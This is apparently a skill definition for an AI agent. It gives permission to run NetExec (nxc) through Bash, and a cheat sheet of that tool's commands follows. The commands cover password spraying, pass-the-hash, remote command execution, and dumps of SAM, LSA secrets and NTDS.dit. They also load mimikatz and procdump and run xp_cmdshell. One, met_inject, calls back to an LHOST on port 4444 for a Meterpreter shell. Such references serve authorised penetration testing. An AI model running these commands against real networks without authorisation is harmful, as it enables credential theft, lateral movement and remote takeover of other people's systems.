---
name: netexec-cli
description: "NetExec (nxc) — аудит аутентификации сетевых протоколов: SMB, WinRM, LDAP, MSSQL, SSH, RDP. Расположен: ~/.local/bin/netexec."
allowed-tools: Bash(netexec *), Bash(nxc *), Read
---

# netexec-cli

Binary: `$NETEXEC_BIN` (also aliased as `nxc`)

## Protocol syntax

```bash
nxc <protocol> <target> [options]
# Protocols: smb, winrm, ldap, mssql, ssh, rdp, ftp, wmi
```

## Key invocations

```bash
# SMB host enumeration
nxc smb <subnet>/24

# Password spray (single password, many users)
nxc smb <target> -u users.txt -p 'Password123' --continue-on-success

# Pass-the-hash
nxc smb <target> -u Administrator -H <NTLM-hash>

# Command execution
nxc smb <target> -u admin -p pass -x "whoami"

# Dump SAM
nxc smb <target> -u admin -p pass --sam

# LSA secrets
nxc smb <target> -u admin -p pass --lsa

# NTDS.dit dump (DC)
nxc smb <target> -u admin -p pass --ntds

# WinRM shell
nxc winrm <target> -u admin -p pass

# LDAP bloodhound collection
nxc ldap <target> -u admin -p pass --bloodhound -ns <dc-ip> -c All

# MSSQL xp_cmdshell
nxc mssql <target> -u sa -p pass -q "exec xp_cmdshell 'whoami'"

# Shares enum
nxc smb <target> -u admin -p pass --shares

# RDP screenshot (if rdpshot available)
nxc rdp <subnet>/24 -u admin -p pass --screenshot
```

## Modules

```bash
nxc smb <target> -u admin -p pass -M mimikatz
nxc smb <target> -u admin -p pass -M procdump
nxc smb <target> -u admin -p pass -M met_inject --options LHOST=<ip> LPORT=4444
nxc smb <target> --list-modules
```
